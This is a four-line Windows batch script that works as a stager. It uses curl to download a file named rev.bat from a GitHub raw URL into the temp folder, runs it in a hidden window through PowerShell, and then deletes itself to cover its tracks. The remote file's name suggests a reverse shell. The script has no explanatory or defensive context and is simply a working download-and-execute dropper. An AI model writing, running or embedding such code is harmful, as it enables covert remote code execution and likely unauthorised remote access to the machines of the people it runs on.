@echo off
curl https://raw.githubusercontent.com/0x2034/shell1/main/rev.bat -o "%temp%\rev.bat"
powershell -c "Start-Process -FilePath "%temp%\rev.bat" -WindowStyle Hidden"
del "%~f0"
